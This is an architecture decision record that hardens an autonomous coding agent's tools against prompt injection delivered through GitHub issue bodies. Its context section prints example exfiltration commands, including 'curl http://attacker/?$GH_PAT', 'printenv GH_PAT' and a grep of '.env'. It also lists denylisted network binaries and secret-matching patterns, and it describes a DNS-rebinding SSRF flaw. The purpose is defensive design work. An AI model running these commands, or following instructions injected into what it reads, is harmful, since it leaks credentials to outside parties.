# ADR 0037: Worker Tool Trust Boundary Hardening

## Status
Accepted (extends [ADR-0035](./0035-runtime-path-safety-validation-in-worker-tools.md) and [ADR-0028](./0028-url-fetch-ssrf-validation-strategy.md); addresses findings from the 2026 forensic review)

## Context
The Worker agent runs unattended against a **Target Repository** whose primary input — the GitHub issue body — is attacker-controllable. The issue body is concatenated verbatim into the Worker `user` message (`nodes.py` execute path → `worker.py:158-165`) with only an advisory, planner-side "CRITICAL SECURITY INSTRUCTION" (`nodes.py:619-624`) and **no untrusted-input framing in the Worker system prompt**. The Worker holds the full tool suite, including `run_command` and `fetch_url`.

The current trust boundary has four exploitable gaps, each verified against the code:

1. **`run_command` executes arbitrary binaries with the parent environment.** `tools.py:422-430` calls `subprocess.run(args, …)` with **no `env=` argument**, so the child inherits the full orchestrator environment — confirmed live: `GH_PAT` and `OPENROUTER_API_KEY` are required (`scripts/entrypoint.py:42-48`, `.github/workflows/pr-checks.yml:9-10`). `shell=False` + `shlex.split` only blocks shell-metacharacter injection; it does not restrict *which* program runs and does not sanitize the environment. Unlike `fetch_url`, `run_command` has no egress/SSRF control. A prompt-injected Worker can run `printenv GH_PAT` or `curl http://attacker/?$GH_PAT`, returning the live token into the LLM context (sent to OpenRouter on the next turn) and persisting it unredacted to `.agent_logs/worker_trace_*.jsonl` (`worker.py:252-271`).

2. **`grep_search`/`list_directory` bypass the sensitive-path blocklist.** ADR-0035's runtime `is_safe_path` blocklist is enforced only in `read_file` (`tools.py:124`) and `patch_file` (`:315`). `grep_search` (`:245-248`) and `list_directory` (`:205-208`) call only `_normalize_path`. The explicit-file branch `grep_search` (`:281-282`) calls `search_file(abs_path)` directly with no blocklist. `.env`, `*.pem`, `.git/config` all live *inside* `project_root`, so `_normalize_path` keeps them reachable. `grep_search(query="OPENROUTER", path=".env")` returns live keys into the LLM context — directly defeating ADR-0035's stated goal that "secrets never enter the agent's context."

3. **`fetch_url` has a DNS-rebinding TOCTOU.** `research_tools.py` validates with `socket.getaddrinfo` (`:284`) but `opener.open(req)` (`:355`) performs an **independent second DNS resolution**; per-hop re-validation (`:398`) re-runs the same TOCTOU. This is the exact defect class of **CVE-2026-41488** (langchain-openai, fixed in 1.1.14 by DNS pinning) and **CVE-2026-12075** (nltk). The module docstring claims rebinding is defended, but it only covers simultaneous round-robin, not TTL-0 rebinding to a cloud-metadata endpoint.

4. **Tool results are persisted/exported unredacted.** `_write_worker_trace` (`worker.py:252-271`) serializes every `tool_call` argument and `ToolMessage` result verbatim; telemetry span INPUT_VALUE/OUTPUT_VALUE/TOOL_PARAMETERS (`scripts/telemetry.py:24-28`) are exported to the OTLP endpoint (Langfuse Cloud by default). Any secret that reaches a tool result is durably exposed.

These four compose into an end-to-end chain: issue-body prompt injection → prompt-injected Worker → `run_command`/`grep_search` reads secrets → secrets enter LLM context (sent to OpenRouter) and are persisted to disk/telemetry. OWASP ranks this class as **LLM01:2025** (Prompt Injection) and **LLM02:2025** (Sensitive Information Disclosure) — the top two LLM-application risks.

## Decision
Harden the Worker tool trust boundary with **defense-in-depth layers**, each closing one gap. No single layer is trusted alone; the goal is to make the chain fail closed even if the LLM is fully compromised by an injected issue body.

1. **`run_command`: command allowlist + secret-stripped environment.**
   - Reject any command whose `args[0]` basename is not in an explicit allowlist (`python`, `python3`, `pytest`, `pip`, `make`, `git`, `ruff`, `mypy`, `semgrep`, `pip-audit`, `echo`). Network binaries (`curl`, `wget`, `nc`, `ssh`, `scp`, …) are **intentionally excluded** — outbound research must go through `fetch_url`, which has SSRF protection. File-reading binaries (`cat`, `ls`, …) are **also excluded**: they read arbitrary paths with no `is_safe_path` check, so a prompt-injected Worker could `cat .env` or `ls .git` and leak secrets into the LLM context, defeating layer 2. File inspection must go through the `is_safe_path`-protected `read_file` / `list_directory` / `grep_search` tools.
   - Pass a sanitized `env=` to `subprocess.run`: drop `GH_PAT`, `OPENROUTER_API_KEY`, `GITHUB_TOKEN`, and any var matching `(_KEY|_TOKEN|_SECRET|_PASSWORD)$` (case-insensitive). This is the NVIDIA 2026 "secret injection / per-task secrets" pattern: secrets are never present in an LLM-driven subprocess unless the task explicitly needs them.
   - Reject attempts to override the allowlist via PATH tricks (`os.path.basename(args[0])`, absolute paths only via the allowlist set).

2. **`is_safe_path` on every read-bearing tool.** `grep_search` and `list_directory` validate the resolved relative path with `is_safe_path` *before* any read, mirroring `read_file`/`patch_file`. In `grep_search`'s recursive walk, re-check each walked file's relative path before `search_file`. This closes ADR-0035's read-bypass and makes the blocklist uniform across the read surface.

3. **`fetch_url` DNS pinning.** Resolve the hostname exactly once with `getaddrinfo`, validate every returned IP against the existing blocklist, then **connect to a literal validated IP** (preserving the original `Host` header) instead of letting `urllib` re-resolve. This eliminates the TOCTOU by construction — there is no second resolution to rebind. Matches the CVE-2026-41488 upstream fix pattern.

4. **Secret redaction in traces and telemetry.** Redact known secret shapes (regex for `ghp_…`, `sk-or-v1-…`, `github_pat_…`, and `*_KEY`/`*_TOKEN` assignment lines) in `_serialize_message` before writing `worker_trace_*.jsonl`, and mark the redaction span attributes in telemetry. Defense-in-depth: even if a secret reaches a tool result, it is not durably persisted/exported.

5. **Untrusted-input framing in the Worker system prompt.** Delimit and label the issue body as untrusted content in `SYSTEM_PROMPT` (mirroring the planner's advisory), so the Worker treats issue-body instructions as data, not commands. This is a soft layer — prompt-level mitigations are bypassable — but it raises the bar and is cheap.

6. **Bounded reads.** Cap `read_file` bytes (like `fetch_url`'s `MAX_FETCH_BYTES`) and cap `grep_search` match count, closing the OOM vector (CWE-400) on planted oversized files.

## Considered Options
- **Full microVM/ syscall sandbox (Firecracker/gVisor/bubblewrap)** — rejected as the *primary* fix: heavy infra, breaks the in-process LangGraph model, and out of proportion for a single-container orchestrator. Recommended as a *future* hardening tier (NVIDIA 2026 / OWASP converge on process isolation as the strongest control); tracked separately, not blocked on it.
- **Network egress allowlist/proxy** — recommended as a complementary layer (NVIDIA 2026: "define exactly which external APIs the agent may call, enforce via an egress proxy"), but out of scope of this ADR's code changes; the `run_command` allowlist (no network binaries) is the in-process equivalent.
- **Drop `run_command` entirely** — rejected: verification (`make verify`, pytest) is a core Worker capability; the allowlist preserves it while removing arbitrary execution.
- **Rely on prompt-level injection defense only** — rejected: OWASP LLM01:2025 explicitly states prompt injection "cannot be filtered out with regex"; structural controls (allowlist, env stripping, DNS pinning) are required.
- **Per-tool `is_safe_path` via a decorator** — deferred: a shared decorator would DRY the four call sites but adds indirection; the inline check is a 3-line addition per tool and easier to audit.

## Consequences
- **Pro**: the issue-body → secret-exfiltration chain fails closed: even a fully prompt-injected Worker cannot read secrets via `grep_search`/`list_directory`, cannot exfiltrate via `run_command` (no network binaries + no secrets in env), cannot reach internal hosts via `fetch_url` (DNS pinned), and any residual secret in a tool result is redacted before persistence/export.
- **Pro**: closes the exact CVE-2026-41488 / CVE-2026-12075 DNS-rebinding class for `fetch_url`.
- **Pro**: makes ADR-0035's blocklist uniform and trustworthy across the whole read surface.
- **Con**: the `run_command` allowlist is a maintenance surface — adding a legitimate tool requires updating the set. Mitigated by making the set config-overridable (`AGENT_RUN_COMMAND_ALLOWLIST`) with the curated default.
- **Con**: secret redaction in traces reduces debuggability of tool results; mitigated by preserving structure (`{"redacted": "<ghp_…>"}`) so reviewers know what was scrubbed.
- **Con**: DNS pinning adds one resolution step; negligible latency, and correctness > speed for a research tool.
- **Risk**: this is defense-in-depth, not a sandbox. A determined attacker who compromises the *process itself* (not just the LLM) still wins. Process isolation (Considered Option 1) remains the long-term goal.

## Inspiration & References
- **OWASP Top 10 for LLM Applications (2025)** — LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure (top two risks for the third consecutive year). https://owasp.org/www-project-top-10-for-large-language-model-applications/
- **NVIDIA (2026) — Practical Security Guidance for Sandboxing Agentic Workflows** — "Use a secret injection approach to prevent secrets from being exposed to the agent … secrets in environment variables are often inherited by sandboxed processes"; network egress allowlists; per-task secrets provisioning. https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk
- **CVE-2026-41488 — langchain-openai SSRF via DNS rebinding** (fixed in 1.1.14 by DNS pinning) — the exact TOCTOU pattern in `fetch_url` and the exact fix pattern adopted here. https://www.sentinelone.com/vulnerability-database/cve-2026-41488
- **CVE-2026-12075 — nltk DNS-Rebinding SSRF Filter Bypass** — "resolve the hostname exactly once, validate the resulting IP, then replace the hostname in the request with that literal IP so no second resolution can occur." https://securelayer7.net/lab/cve-2026-12075-nltk-dns-rebinding-ssrf-bypass
- **OWASP SSRF Prevention** — "Trusting the initial DNS resolution" is a documented pitfall; validate redirect chains; blocklists are easy to bypass. https://owasp.org/www-community/pages/controls/SSRF_Prevention_in_Nodejs
- **BeyondScale (2026) — AI Agent Sandboxing Enterprise Guide** — kernel-level isolation, network egress allowlists, configuration-file write protection, per-task secrets. https://beyondscale.tech/blog/ai-agent-sandboxing-enterprise-security-guide
- **OWASP Top 10 Agents & AI Vulnerabilities (2026 Cheat Sheet)** — LLM01/LLM02 mapping; "if your agent must execute code, do it inside an ephemeral, network-isolated microVM or restricted Wasm sandbox." https://blog.alexewerlof.com/p/owasp-top-10-ai-llm-agents
- Extends [ADR-0035](./0035-runtime-path-safety-validation-in-worker-tools.md) (runtime path-safety) and [ADR-0028](./0028-url-fetch-ssrf-validation-strategy.md) (URL fetch SSRF validation).
